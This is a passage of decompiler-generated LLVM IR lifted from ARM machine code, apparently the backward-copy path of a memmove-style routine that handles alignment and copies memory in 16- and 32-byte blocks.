  %v1_12030 = inttoptr i32 %v0_12030 to i32*
  %v2_12030 = load i32, i32* %v1_12030, align 4
  store i32 %v2_12030, i32* @lr, align 4
  %v4_12030 = add i32 %v0_12030, 4
  store i32 %v4_12030, i32* %r1.global-to-local, align 4
  %v4_12034 = mul i32 %v2_12030, 256
  %v5_12034 = or i32 %v4_12034, %v3_1202c
  store i32 %v5_12034, i32* @ip, align 4
  %v2_12038 = inttoptr i32 %v1_12038 to i32*
  store i32 %v5_12034, i32* %v2_12038, align 4
  %v3_12038 = load i32, i32* %r0.global-to-local, align 4
  %v4_12038 = add i32 %v3_12038, 4
  store i32 %v4_12038, i32* %r0.global-to-local, align 4
  %v0_1203c = load i32, i32* %r2.global-to-local, align 4
  %v2_1203c = add i32 %v0_1203c, -4
  store i32 %v2_1203c, i32* %r2.global-to-local, align 4
  %v6_12040 = icmp slt i32 %v0_1203c, 4
  br i1 %v6_12040, label %dec_label_pc_12044.loopexit, label %dec_label_pc_1202c

dec_label_pc_12044.loopexit:                      ; preds = %dec_label_pc_1202c
  %v4_1203c = sub i32 3, %v0_1203c
  %v5_1203c = and i32 %v4_1203c, %v0_1203c
  %v6_1203c = icmp slt i32 %v5_1203c, 0
  %v7_1203c = icmp slt i32 %v2_1203c, 0
  store i1 %v6_1203c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_1203c, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12044

dec_label_pc_12044:                               ; preds = %dec_label_pc_12044.loopexit, %dec_label_pc_12020
  %v2_11eac112 = phi i32 [ %v4_12038, %dec_label_pc_12044.loopexit ], [ %v12_12014, %dec_label_pc_12020 ]
  %v0_11e9c108 = phi i32 [ %v2_1203c, %dec_label_pc_12044.loopexit ], [ %v2_12024, %dec_label_pc_12020 ]
  %v0_12044 = load i32, i32* %r1.global-to-local, align 4
  %v1_12044 = add i32 %v0_12044, -1
  store i32 %v1_12044, i32* @r1, align 4
  br label %bb133

dec_label_pc_1204c:                               ; preds = %dec_label_pc_11e00
  %v1_1204c = load i32, i32* @r2, align 4
  %v2_1204c = add i32 %v1_1204c, %v0_11e00
  store i32 %v2_1204c, i32* @r1, align 4
  %v2_12050 = add i32 %v1_1204c, %v1_11e00
  store i32 %v2_12050, i32* %r0.global-to-local, align 4
  %v2_12054 = add i32 %v1_1204c, -4
  store i32 %v2_12054, i32* %r2.global-to-local, align 4
  %v4_12054 = sub i32 3, %v1_1204c
  %v5_12054 = and i32 %v4_12054, %v1_1204c
  %v6_12054 = icmp slt i32 %v5_12054, 0
  store i1 %v6_12054, i1* %cpsr_v.global-to-local, align 1
  %v7_12054 = icmp slt i32 %v2_12054, 0
  store i1 %v7_12054, i1* %cpsr_n.global-to-local, align 1
  %v5_12058 = icmp slt i32 %v1_1204c, 4
  br i1 %v5_12058, label %bb143, label %dec_label_pc_1205c

dec_label_pc_1205c:                               ; preds = %dec_label_pc_1204c
  %v1_1205c = urem i32 %v2_12050, 4
  store i32 %v1_1205c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1205c = icmp eq i32 %v1_1205c, 0
  br i1 %v2_1205c, label %dec_label_pc_12064, label %dec_label_pc_12104

dec_label_pc_12064:                               ; preds = %dec_label_pc_1205c
  %v1_12064 = urem i32 %v2_1204c, 4
  store i32 %v1_12064, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_12064 = icmp eq i32 %v1_12064, 0
  br i1 %v2_12064, label %dec_label_pc_1206c, label %dec_label_pc_12130

dec_label_pc_1206c:                               ; preds = %dec_label_pc_12064, %dec_label_pc_12128
  %v0_1208449 = phi i32 [ %v2_12050, %dec_label_pc_12064 ], [ %v0_1217832, %dec_label_pc_12128 ]
  %v0_1208048 = phi i32 [ %v2_1204c, %dec_label_pc_12064 ], [ %v0_12128, %dec_label_pc_12128 ]
  %v0_1206c = phi i32 [ %v2_12054, %dec_label_pc_12064 ], [ %v2_12120, %dec_label_pc_12128 ]
  %v2_1206c = add i32 %v0_1206c, -8
  store i32 %v2_1206c, i32* %r2.global-to-local, align 4
  %v4_1206c = sub i32 7, %v0_1206c
  %v5_1206c = and i32 %v4_1206c, %v0_1206c
  %v6_1206c = icmp slt i32 %v5_1206c, 0
  store i1 %v6_1206c, i1* %cpsr_v.global-to-local, align 1
  %v7_1206c = icmp slt i32 %v2_1206c, 0
  store i1 %v7_1206c, i1* %cpsr_n.global-to-local, align 1
  %v5_12070 = icmp slt i32 %v0_1206c, 8
  br i1 %v5_12070, label %dec_label_pc_120bc, label %dec_label_pc_12074

dec_label_pc_12074:                               ; preds = %dec_label_pc_1206c
  %v3_12074 = load i32, i32* @r4, align 4
  %v5_12074 = inttoptr i32 %v3_12074 to i8*
  store i8* %v5_12074, i8** %stack_var_-8, align 4
  %v8_12074 = load i32, i32* @lr, align 4
  %v2_12078 = add i32 %v0_1206c, -28
  store i32 %v2_12078, i32* %r2.global-to-local, align 4
  %v4_12078 = sub i32 27, %v0_1206c
  %v5_12078 = and i32 %v4_12078, %v2_1206c
  %v6_12078 = icmp slt i32 %v5_12078, 0
  store i1 %v6_12078, i1* %cpsr_v.global-to-local, align 1
  %v7_12078 = icmp slt i32 %v2_12078, 0
  store i1 %v7_12078, i1* %cpsr_n.global-to-local, align 1
  %v5_1207c = icmp slt i32 %v2_1206c, 20
  br i1 %v5_1207c, label %dec_label_pc_12098, label %dec_label_pc_12080

dec_label_pc_12080:                               ; preds = %dec_label_pc_12074, %dec_label_pc_12080.dec_label_pc_12080_crit_edge
  %v0_12084 = phi i32 [ %v1_1208c, %dec_label_pc_12080.dec_label_pc_12080_crit_edge ], [ %v0_1208449, %dec_label_pc_12074 ]
  %v0_12080 = phi i32 [ %v0_12080.pre, %dec_label_pc_12080.dec_label_pc_12080_crit_edge ], [ %v0_1208048, %dec_label_pc_12074 ]
  %v1_12080 = add i32 %v0_12080, -4
  %v2_12080 = inttoptr i32 %v1_12080 to i32*
  %v3_12080 = load i32, i32* %v2_12080, align 4
  store i32 %v3_12080, i32* %r3.global-to-local, align 4
  %v4_12080 = add i32 %v0_12080, -8
  %v5_12080 = inttoptr i32 %v4_12080 to i32*
  %v6_12080 = load i32, i32* %v5_12080, align 4
  store i32 %v6_12080, i32* %r4.global-to-local, align 4
  %v7_12080 = add i32 %v0_12080, -12
  %v8_12080 = inttoptr i32 %v7_12080 to i32*
  %v9_12080 = load i32, i32* %v8_12080, align 4
  store i32 %v9_12080, i32* %ip.global-to-local, align 4
  %v10_12080 = add i32 %v0_12080, -16
  %v11_12080 = inttoptr i32 %v10_12080 to i32*
  %v12_12080 = load i32, i32* %v11_12080, align 4
  store i32 %v12_12080, i32* %lr.global-to-local, align 4
  store i32 %v10_12080, i32* %r1.global-to-local, align 4
  %v1_12084 = add i32 %v0_12084, -16
  %v2_12084 = inttoptr i32 %v1_12084 to i32*
  store i32 %v3_12080, i32* %v2_12084, align 4
  %v4_12084 = add i32 %v0_12084, -12
  %v5_12084 = inttoptr i32 %v4_12084 to i32*
  %v6_12084 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_12084, i32* %v5_12084, align 4
  %v7_12084 = add i32 %v0_12084, -8
  %v8_12084 = inttoptr i32 %v7_12084 to i32*
  %v9_12084 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_12084, i32* %v8_12084, align 4
  %v10_12084 = add i32 %v0_12084, -4
  %v11_12084 = inttoptr i32 %v10_12084 to i32*
  %v12_12084 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_12084, i32* %v11_12084, align 4
  store i32 %v1_12084, i32* %r0.global-to-local, align 4
  %v0_12088 = load i32, i32* %r1.global-to-local, align 4
  %v1_12088 = add i32 %v0_12088, -4
  %v2_12088 = inttoptr i32 %v1_12088 to i32*
  %v3_12088 = load i32, i32* %v2_12088, align 4
  store i32 %v3_12088, i32* %r3.global-to-local, align 4
  %v4_12088 = add i32 %v0_12088, -8
  %v5_12088 = inttoptr i32 %v4_12088 to i32*
  %v6_12088 = load i32, i32* %v5_12088, align 4
  store i32 %v6_12088, i32* %r4.global-to-local, align 4
  %v7_12088 = add i32 %v0_12088, -12
  %v8_12088 = inttoptr i32 %v7_12088 to i32*
  %v9_12088 = load i32, i32* %v8_12088, align 4
  store i32 %v9_12088, i32* @ip, align 4
  %v10_12088 = add i32 %v0_12088, -16
  %v11_12088 = inttoptr i32 %v10_12088 to i32*
  %v12_12088 = load i32, i32* %v11_12088, align 4
  store i32 %v12_12088, i32* %lr.global-to-local, align 4
  store i32 %v10_12088, i32* @r1, align 4
  %v1_1208c = add i32 %v0_12084, -32
  %v2_1208c = inttoptr i32 %v1_1208c to i32*
  store i32 %v3_12088, i32* %v2_1208c, align 4
  %v4_1208c = add i32 %v0_12084, -28
  %v5_1208c = inttoptr i32 %v4_1208c to i32*
  %v6_1208c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_1208c, i32* %v5_1208c, align 4
  %v7_1208c = add i32 %v0_12084, -24
  %v8_1208c = inttoptr i32 %v7_1208c to i32*
  %v9_1208c = load i32, i32* @ip, align 4
  store i32 %v9_1208c, i32* %v8_1208c, align 4
  %v10_1208c = add i32 %v0_12084, -20
  %v11_1208c = inttoptr i32 %v10_1208c to i32*
  %v12_1208c = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_1208c, i32* %v11_1208c, align 4
  store i32 %v1_1208c, i32* %r0.global-to-local, align 4
  %v0_12090 = load i32, i32* %r2.global-to-local, align 4
  %v2_12090 = add i32 %v0_12090, -32
  store i32 %v2_12090, i32* %r2.global-to-local, align 4
  %v6_12094 = icmp slt i32 %v0_12090, 32
  br i1 %v6_12094, label %dec_label_pc_12098.loopexit, label %dec_label_pc_12080.dec_label_pc_12080_crit_edge

dec_label_pc_12080.dec_label_pc_12080_crit_edge:  ; preds = %dec_label_pc_12080
  %v0_12080.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_12080

dec_label_pc_12098.loopexit:                      ; preds = %dec_label_pc_12080
  %v4_12090 = sub i32 31, %v0_12090
  %v5_12090 = and i32 %v4_12090, %v0_12090
  %v6_12090 = icmp slt i32 %v5_12090, 0
  %v7_12090 = icmp slt i32 %v2_12090, 0
  store i1 %v6_12090, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_12090, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_12098

dec_label_pc_12098:                               ; preds = %dec_label_pc_12098.loopexit, %dec_label_pc_12074
  %v6_120a0 = phi i32 [ %v1_1208c, %dec_label_pc_12098.loopexit ], [ %v0_1208449, %dec_label_pc_12074 ]
  %v0_120a8.pr = phi i32 [ %v2_12090, %dec_label_pc_12098.loopexit ], [ %v2_12078, %dec_label_pc_12074 ]
  %v4_12098 = add i32 %v0_120a8.pr, 16
  %v6_12098 = sub i32 0, %v0_120a8.pr
  %v7_12098 = and i32 %v4_12098, %v6_12098
  %v8_12098 = icmp slt i32 %v7_12098, 0
  store i1 %v8_12098, i1* %cpsr_v.global-to-local, align 1
  %v9_12098 = icmp slt i32 %v4_12098, 0
  store i1 %v9_12098, i1* %cpsr_n.global-to-local, align 1
  %v5_1209c = icmp slt i32 %v0_120a8.pr, -16
  br i1 %v5_1209c, label %.thread14, label %bb140

bb140:                                            ; preds = %dec_label_pc_12098
  %v6_1209c = load i32, i32* @r1, align 4
  %v7_1209c = add i32 %v6_1209c, -4
  %v8_1209c = inttoptr i32 %v7_1209c to i32*
  %v9_1209c = load i32, i32* %v8_1209c, align 4
  store i32 %v9_1209c, i32* %r3.global-to-local, align 4
  %v10_1209c = add i32 %v6_1209c, -8
  %v11_1209c = inttoptr i32 %v10_1209c to i32*
  %v12_1209c = load i32, i32* %v11_1209c, align 4
  store i32 %v12_1209c, i32* %r4.global-to-local, align 4
  %v13_1209c = add i32 %v6_1209c, -12
  %v14_1209c = inttoptr i32 %v13_1209c to i32*
  %v15_1209c = load i32, i32* %v14_1209c, align 4
  store i32 %v15_1209c, i32* @ip, align 4
  %v16_1209c = add i32 %v6_1209c, -16
  %v17_1209c = inttoptr i32 %v16_1209c to i32*
  %v18_1209c = load i32, i32* %v17_1209c, align 4
  store i32 %v18_1209c, i32* %lr.global-to-local, align 4
  store i32 %v16_1209c, i32* @r1, align 4
  %v7_120a0 = add i32 %v6_120a0, -16
  %v8_120a0 = inttoptr i32 %v7_120a0 to i32*
  store i32 %v9_1209c, i32* %v8_120a0, align 4
  %v10_120a0 = add i32 %v6_120a0, -12
  %v11_120a0 = inttoptr i32 %v10_120a0 to i32*
  %v12_120a0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_120a0, i32* %v11_120a0, align 4
  %v13_120a0 = add i32 %v6_120a0, -8
  %v14_120a0 = inttoptr i32 %v13_120a0 to i32*
  %v15_120a0 = load i32, i32* @ip, align 4
  store i32 %v15_120a0, i32* %v14_120a0, align 4
  %v16_120a0 = add i32 %v6_120a0, -4
  %v17_120a0 = inttoptr i32 %v16_120a0 to i32*
  %v18_120a0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_120a0, i32* %v17_120a0, align 4
  store i32 %v7_120a0, i32* %r0.global-to-local, align 4
  %v6_120a4 = load i32, i32* %r2.global-to-local, align 4
  %v7_120a4 = add i32 %v6_120a4, -16
  store i32 %v7_120a4, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_12098, %bb140
  %v6_120b0 = phi i32 [ %v7_120a0, %bb140 ], [ %v6_120a0, %dec_label_pc_12098 ]
  %v0_120a8 = phi i32 [ %v7_120a4, %bb140 ], [ %v0_120a8.pr, %dec_label_pc_12098 ]
  %v4_120a8 = add i32 %v0_120a8, 20
  store i32 %v4_120a8, i32* %r2.global-to-local, align 4
  %v6_120a8 = sub i32 0, %v0_120a8
  %v7_120a8 = and i32 %v4_120a8, %v6_120a8
  %v8_120a8 = icmp slt i32 %v7_120a8, 0
  store i1 %v8_120a8, i1* %cpsr_v.global-to-local, align 1
  %v9_120a8 = icmp slt i32 %v4_120a8, 0
  store i1 %v9_120a8, i1* %cpsr_n.global-to-local, align 1
  %v5_120ac = icmp slt i32 %v0_120a8, -20
  br i1 %v5_120ac, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_120ac = load i32, i32* @r1, align 4
  %v7_120ac = add i32 %v6_120ac, -4
  %v8_120ac = inttoptr i32 %v7_120ac to i32*
  %v9_120ac = load i32, i32* %v8_120ac, align 4
  store i32 %v9_120ac, i32* %r3.global-to-local, align 4
  %v10_120ac = add i32 %v6_120ac, -8
  %v11_120ac = inttoptr i32 %v10_120ac to i32*
  %v12_120ac = load i32, i32* %v11_120ac, align 4
  store i32 %v12_120ac, i32* @ip, align 4
  %v13_120ac = add i32 %v6_120ac, -12
  %v14_120ac = inttoptr i32 %v13_120ac to i32*
  %v15_120ac = load i32, i32* %v14_120ac, align 4
  store i32 %v15_120ac, i32* %lr.global-to-local, align 4
  store i32 %v13_120ac, i32* @r1, align 4
  %v7_120b0 = add i32 %v6_120b0, -12
  %v8_120b0 = inttoptr i32 %v7_120b0 to i32*
  store i32 %v9_120ac, i32* %v8_120b0, align 4
  %v10_120b0 = add i32 %v6_120b0, -8
  %v11_120b0 = inttoptr i32 %v10_120b0 to i32*
  %v12_120b0 = load i32, i32* @ip, align 4
  store i32 %v12_120b0, i32* %v11_120b0, align 4
  %v13_120b0 = add i32 %v6_120b0, -4
  %v14_120b0 = inttoptr i32 %v13_120b0 to i32*
  %v15_120b0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_120b0, i32* %v14_120b0, align 4
  store i32 %v7_120b0, i32* %r0.global-to-local, align 4
  %v6_120b4 = load i32, i32* %r2.global-to-local, align 4
  %v7_120b4 = add i32 %v6_120b4, -12
  store i32 %v7_120b4, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_120d457 = phi i32 [ %v6_120b0, %.thread14 ], [ %v7_120b0, %bb141 ]
  %v0_120bc55 = phi i32 [ %v4_120a8, %.thread14 ], [ %v7_120b4, %bb141 ]
  %v2_120b8 = load i8*, i8** %stack_var_-8, align 4
  %v3_120b8 = ptrtoint i8* %v2_120b8 to i32
  store i32 %v3_120b8, i32* @r4, align 4
  store i32 %v8_12074, i32* @lr, align 4
  br label %dec_label_pc_120bc

dec_label_pc_120bc:                               ; preds = %dec_label_pc_1206c, %.thread16
  %v7_120cc = phi i32 [ %v0_1208449, %dec_label_pc_1206c ], [ %v6_120d457, %.thread16 ]
  %v0_120bc = phi i32 [ %v2_1206c, %dec_label_pc_1206c ], [ %v0_120bc55, %.thread16 ]
  %v2_120bc = add i32 %v0_120bc, 8
  store i32 %v2_120bc, i32* %r2.global-to-local, align 4
  %v4_120bc = sub i32 0, %v0_120bc
  %v5_120bc = and i32 %v2_120bc, %v4_120bc
  %v6_120bc = icmp slt i32 %v5_120bc, 0
  store i1 %v6_120bc, i1* %cpsr_v.global-to-local, align 1
  %v7_120bc = icmp slt i32 %v2_120bc, 0
  store i1 %v7_120bc, i1* %cpsr_n.global-to-local, align 1
  %v5_120c0 = icmp slt i32 %v0_120bc, -8
  br i1 %v5_120c0, label %bb143, label %dec_label_pc_120c4

dec_label_pc_120c4:                               ; preds = %dec_label_pc_120bc
  %v6_120c4 = add i32 %v0_120bc, 4
  store i32 %v6_120c4, i32* %r2.global-to-local, align 4
  %v8_120c4 = sub i32 -5, %v0_120bc
  %v9_120c4 = and i32 %v8_120c4, %v2_120bc
  %v10_120c4 = icmp slt i32 %v9_120c4, 0
  store i1 %v10_120c4, i1* %cpsr_v.global-to-local, align 1
  %v11_120c4 = icmp slt i32 %v6_120c4, 0
  store i1 %v11_120c4, i1* %cpsr_n.global-to-local, align 1
  %v5_120c8 = icmp slt i32 %v2_120bc, 4
  %v6_120c8 = load i32, i32* @r1, align 4
  %v7_120c8 = add i32 %v6_120c8, -4
  %v8_120c8 = inttoptr i32 %v7_120c8 to i32*
  %v9_120c8 = load i32, i32* %v8_120c8, align 4
  store i32 %v9_120c8, i32* %r3.global-to-local, align 4
  br i1 %v5_120c8, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_120c4
  store i32 %v7_120c8, i32* @r1, align 4
  %v8_120cc = add i32 %v7_120cc, -4
  %v9_120cc = inttoptr i32 %v8_120cc to i32*
  store i32 %v9_120c8, i32* %v9_120cc, align 4
  %v10_120cc = load i32, i32* %r0.global-to-local, align 4
  %v11_120cc = add i32 %v10_120cc, -4
  store i32 %v11_120cc, i32* %r0.global-to-local, align 4
  %v0_120dc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_120c4
  %v10_120d0 = add i32 %v6_120c8, -8
  %v11_120d0 = inttoptr i32 %v10_120d0 to i32*
  %v12_120d0 = load i32, i32* %v11_120d0, align 4
  store i32 %v12_120d0, i32* @ip, align 4
  store i32 %v10_120d0, i32* @r1, align 4
  %v7_120d4 = add i32 %v7_120cc, -8
  %v8_120d4 = inttoptr i32 %v7_120d4 to i32*
  store i32 %v9_120c8, i32* %v8_120d4, align 4
  %v10_120d4 = add i32 %v7_120cc, -4
  %v11_120d4 = inttoptr i32 %v10_120d4 to i32*
  %v12_120d4 = load i32, i32* @ip, align 4
  store i32 %v12_120d4, i32* %v11_120d4, align 4
  store i32 %v7_120d4, i32* %r0.global-to-local, align 4
  %v6_120d8 = load i32, i32* %r2.global-to-local, align 4
  %v7_120d8 = add i32 %v6_120d8, -4
  store i32 %v7_120d8, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_120bc, %dec_label_pc_1204c, %dec_label_pc_12280, %dec_label_pc_12214, %dec_label_pc_121a8, %bb142
  %v2_120e0 = phi i32 [ %v11_120cc, %.thread20 ], [ %v0_1217832, %.thread26 ], [ %v7_120cc, %dec_label_pc_120bc ], [ %v2_12050, %dec_label_pc_1204c ], [ %v2_120ec65, %dec_label_pc_12280 ], [ %v2_120ec64, %dec_label_pc_12214 ], [ %v2_120ec63, %dec_label_pc_121a8 ], [ %v7_120d4, %bb142 ]
  %v0_120dc = phi i32 [ %v0_120dc.pre, %.thread20 ], [ %v2_12120, %.thread26 ], [ %v2_120bc, %dec_label_pc_120bc ], [ %v2_12054, %dec_label_pc_1204c ], [ %v0_120dc61, %dec_label_pc_12280 ], [ %v0_120dc60, %dec_label_pc_12214 ], [ %v0_120dc59, %dec_label_pc_121a8 ], [ %v7_120d8, %bb142 ]
  %v1_120dc = add i32 %v0_120dc, 4
  store i32 %v1_120dc, i32* @r2, align 4
  %v3_120dc = sub i32 0, %v0_120dc
  %v4_120dc = and i32 %v1_120dc, %v3_120dc
  %v5_120dc = icmp slt i32 %v4_120dc, 0
  store i1 %v5_120dc, i1* %cpsr_v.global-to-local, align 1
  %v6_120dc = icmp slt i32 %v1_120dc, 0
  store i1 %v6_120dc, i1* %cpsr_n.global-to-local, align 1
  %v7_120dc = icmp eq i32 %v1_120dc, 0
  store i1 %v7_120dc, i1* @cpsr_z, align 1
  br i1 %v7_120dc, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_120e4 = add i32 %v0_120dc, 2
  %v3_120e4 = sub i32 -3, %v0_120dc
  %v4_120e4 = and i32 %v3_120e4, %v1_120dc
  %v5_120e4 = icmp slt i32 %v4_120e4, 0
  store i1 %v5_120e4, i1* %cpsr_v.global-to-local, align 1
  %v6_120e4 = icmp slt i32 %v1_120e4, 0
  store i1 %v6_120e4, i1* %cpsr_n.global-to-local, align 1
  %v7_120e4 = icmp eq i32 %v1_120dc, 2
  store i1 %v7_120e4, i1* @cpsr_z, align 1
  %v0_120e8 = load i32, i32* @r1, align 4
  %v1_120e8 = add i32 %v0_120e8, -1
  %v2_120e8 = inttoptr i32 %v1_120e8 to i8*
  %v3_120e8 = load i8, i8* %v2_120e8, align 1
  %v4_120e8 = zext i8 %v3_120e8 to i32
  store i32 %v4_120e8, i32* %r3.global-to-local, align 4
  store i32 %v1_120e8, i32* @r1, align 4
  %v3_120ec = add i32 %v2_120e0, -1
  %v4_120ec = inttoptr i32 %v3_120ec to i8*
  store i8 %v3_120e8, i8* %v4_120ec, align 1
  %v5_120ec = load i32, i32* %r0.global-to-local, align 4
  %v6_120ec = add i32 %v5_120ec, -1
  store i32 %v6_120ec, i32* %r0.global-to-local, align 4
  %v0_120f0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_120f0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_120f0 = xor i1 %v0_120f0, %v1_120f0
  br i1 %v2_120f0, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_120f0 = load i32, i32* @r1, align 4
  %v4_120f0 = add i32 %v3_120f0, -1
  %v5_120f0 = inttoptr i32 %v4_120f0 to i8*
  %v6_120f0 = load i8, i8* %v5_120f0, align 1
  %v7_120f0 = zext i8 %v6_120f0 to i32
  store i32 %v7_120f0, i32* %r3.global-to-local, align 4
  store i32 %v4_120f0, i32* @r1, align 4
  %v6_120f4 = add i32 %v5_120ec, -2
  %v7_120f4 = inttoptr i32 %v6_120f4 to i8*
  store i8 %v6_120f0, i8* %v7_120f4, align 1
  %v8_120f4 = load i32, i32* %r0.global-to-local, align 4
  %v9_120f4 = add i32 %v8_120f4, -1
  store i32 %v9_120f4, i32* %r0.global-to-local, align 4
  %v1_120f8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_120f8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_120fc = phi i32 [ %v9_120f4, %bb145 ], [ %v6_120ec, %bb144 ]
  %v2_120fc = phi i1 [ %v2_120f8.pre, %bb145 ], [ %v1_120f0, %bb144 ]
  %v1_120fc = phi i1 [ %v1_120f8.pre, %bb145 ], [ %v0_120f0, %bb144 ]
  %v0_120f8 = load i1, i1* @cpsr_z, align 1
  %v3_120f8 = xor i1 %v2_120fc, %v1_120fc
  %v4_120f8 = or i1 %v0_120f8, %v3_120f8
  br i1 %v4_120f8, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_120f8 = load i32, i32* @r1, align 4
  %v6_120f8 = add i32 %v5_120f8, -1
  %v7_120f8 = inttoptr i32 %v6_120f8 to i8*
  %v8_120f8 = load i8, i8* %v7_120f8, align 1
  %v9_120f8 = zext i8 %v8_120f8 to i32
  store i32 %v9_120f8, i32* %r3.global-to-local, align 4
  store i32 %v6_120f8, i32* @r1, align 4
  %v8_120fc = add i32 %v7_120fc, -1
  %v9_120fc = inttoptr i32 %v8_120fc to i8*
  store i8 %v8_120f8, i8* %v9_120fc, align 1
  %v10_120fc = load i32, i32* %r0.global-to-local, align 4
  %v11_120fc = add i32 %v10_120fc, -1
  store i32 %v11_120fc, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_12104:                               ; preds = %dec_label_pc_1205c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_12104 = icmp eq i32 %v1_1205c, 1
  store i1 %v8_12104, i1* %cpsr_n.global-to-local, align 1
  %v1_12108 = add i32 %v2_1204c, -1
  %v2_12108 = inttoptr i32 %v1_12108 to i8*
  %v3_12108 = load i8, i8* %v2_12108, align 1
  %v4_12108 = zext i8 %v3_12108 to i32
  store i32 %v4_12108, i32* %r3.global-to-local, align 4
  store i32 %v1_12108, i32* @r1, align 4
  %v3_1210c = add i32 %v2_12050, -1
  %v4_1210c = inttoptr i32 %v3_1210c to i8*
  store i8 %v3_12108, i8* %v4_1210c, align 1
  %v5_1210c = load i32, i32* %r0.global-to-local, align 4
  %v6_1210c = add i32 %v5_1210c, -1
  store i32 %v6_1210c, i32* %r0.global-to-local, align 4
  br i1 %v8_12104, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_12104
  %v9_12104 = icmp eq i32 %v1_1205c, 2
  %v6_12110 = load i32, i32* @r1, align 4
  %v7_12110 = add i32 %v6_12110, -1
  %v8_12110 = inttoptr i32 %v7_12110 to i8*
  %v9_12110 = load i8, i8* %v8_12110, align 1
  %v10_12110 = zext i8 %v9_12110 to i32
  store i32 %v10_12110, i32* %r3.global-to-local, align 4
  store i32 %v7_12110, i32* @r1, align 4
  %v9_12114 = add i32 %v5_1210c, -2
  %v10_12114 = inttoptr i32 %v9_12114 to i8*
  store i8 %v9_12110, i8* %v10_12114, align 1
  %v11_12114 = load i32, i32* %r0.global-to-local, align 4
  %v12_12114 = add i32 %v11_12114, -1
  store i32 %v12_12114, i32* %r0.global-to-local, align 4
  br i1 %v9_12104, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_12118 = load i32, i32* @r1, align 4
  %v9_12118 = add i32 %v8_12118, -1
  %v10_12118 = inttoptr i32 %v9_12118 to i8*
  %v11_12118 = load i8, i8* %v10_12118, align 1
  %v12_12118 = zext i8 %v11_12118 to i32
  store i32 %v12_12118, i32* %r3.global-to-local, align 4
  store i32 %v9_12118, i32* @r1, align 4
  %v11_1211c = add i32 %v11_12114, -2
  %v12_1211c = inttoptr i32 %v11_1211c to i8*
  store i8 %v11_12118, i8* %v12_1211c, align 1
  %v13_1211c = load i32, i32* %r0.global-to-local, align 4
  %v14_1211c = add i32 %v13_1211c, -1
  store i32 %v14_1211c, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_12104, %bb148
  %v0_1217832 = phi i32 [ %v12_12114, %bb147 ], [ %v6_1210c, %dec_label_pc_12104 ], [ %v14_1211c, %bb148 ]
  %v0_12120 = load i32, i32* %r2.global-to-local, align 4
  %v1_12120 = load i32, i32* @ip, align 4
  %v2_12120 = sub i32 %v0_12120, %v1_12120
  store i32 %v2_12120, i32* %r2.global-to-local, align 4
  %v4_12120 = xor i32 %v1_12120, %v0_12120
  %v5_12120 = xor i32 %v2_12120, %v0_12120
  %v6_12120 = and i32 %v5_12120, %v4_12120
  %v7_12120 = icmp slt i32 %v6_12120, 0
  store i1 %v7_12120, i1* %cpsr_v.global-to-local, align 1
  %v8_12120 = icmp slt i32 %v2_12120, 0
  store i1 %v8_12120, i1* %cpsr_n.global-to-local, align 1
  %v5_12124 = icmp slt i32 %v0_12120, %v1_12120
  br i1 %v5_12124, label %bb143, label %dec_label_pc_12128

dec_label_pc_12128:                               ; preds = %.thread26
  %v0_12128 = load i32, i32* @r1, align 4
  %v1_12128 = urem i32 %v0_12128, 4
  store i32 %v1_12128, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_12128 = icmp eq i32 %v1_12128, 0
  br i1 %v2_12128, label %dec_label_pc_1206c, label %dec_label_pc_12130

dec_label_pc_12130:                               ; preds = %dec_label_pc_12064, %dec_label_pc_12128
  %v0_1217831 = phi i32 [ %v2_12050, %dec_label_pc_12064 ], [ %v0_1217832, %dec_label_pc_12128 ]
  %v0_12224 = phi i32 [ %v2_12054, %dec_label_pc_12064 ], [ %v2_12120, %dec_label_pc_12128 ]
  %v0_12130 = phi i32 [ %v2_1204c, %dec_label_pc_12064 ], [ %v0_12128, %dec_label_pc_12128 ]
  %v0_12138 = phi i32 [ %v1_12064, %dec_label_pc_12064 ], [ %v1_12128, %dec_label_pc_12128 ]
  %v1_12130 = and i32 %v0_12130, -4
  store i32 %v1_12130, i32* %r1.global-to-local, align 4
  %v1_12134 = inttoptr i32 %v1_12130 to i32*
  %v2_12134 = load i32, i32* %v1_12134, align 4
  store i32 %v2_12134, i32* %r3.global-to-local, align 4
  %v7_12138 = icmp ult i32 %v0_12138, 2
  %v2_1221c = add i32 %v0_12224, -12
